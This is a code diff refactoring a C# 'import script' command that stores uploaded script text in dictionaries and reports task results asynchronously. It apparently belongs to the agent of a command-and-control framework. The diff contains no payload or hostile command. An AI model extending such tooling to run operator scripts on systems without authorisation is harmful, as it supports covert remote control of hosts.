@@ -4,6 +4,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using Engineer.Extra;
+using Engineer.Functions;
 using Engineer.Models;
 
 namespace Engineer.Commands
@@ -15,7 +16,7 @@ namespace Engineer.Commands
         public static Dictionary<int, string> ImportedScripts = new Dictionary<int, string>();
         public static Dictionary<int, string> ImportedScriptsTracking = new Dictionary<int, string>();
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
 
             //get the script name from the argument /import but the name is the info after the \ in the file path
@@ -33,13 +34,15 @@ namespace Engineer.Commands
                 //remove the script from the tracking dictionary
                 ImportedScriptsTracking.Remove(scriptToRemove);
                 //return the success message
-                return $"[+] Script {scriptToRemove} removed from the imported scripts list";
+                Tasking.FillTaskResults($"[+] Script {scriptToRemove} removed from the imported scripts list",task,EngTaskStatus.Complete);
+                return;
             }
 
             if (task.File.Length < 1)
             {
                 Console.WriteLine(task.File.Length);
-                return " Error: File not specified";
+                Tasking.FillTaskResults(" Error: File not specified",task,EngTaskStatus.FailedWithWarnings);
+                return;
             }
             var script = Encoding.UTF8.GetString(task.File);
             //if ImportedScripts dictionary is empty, add the script to the dictionary with a key of 1, if it is not check if it holds the script, if it does return the key, if it does not add it to the dictionary and return the key
@@ -47,20 +50,20 @@ namespace Engineer.Commands
             {
                 ImportedScripts.Add(1, script);
                 ImportedScriptsTracking.Add(1, scriptName);
-                return "Script Imported";
+                Tasking.FillTaskResults("Script Imported",task,EngTaskStatus.Complete);
             }
             else
             {
                 if (ImportedScripts.ContainsValue(script))
                 {
-                    return "script already imported, if u want to reimport, use the remove option and then re add it";
+                    Tasking.FillTaskResults("script already imported, if u want to reimport, use the remove option and then re add it", task, EngTaskStatus.FailedWithWarnings);
                 }
                 else
                 {
                     var key = ImportedScripts.Keys.Max() + 1;
                     ImportedScripts.Add(key, script);
                     ImportedScriptsTracking.Add(key, scriptName);
-                    return "Script Imported";
+                    Tasking.FillTaskResults("Script Imported",task,EngTaskStatus.Complete);
                 }
             }
         }
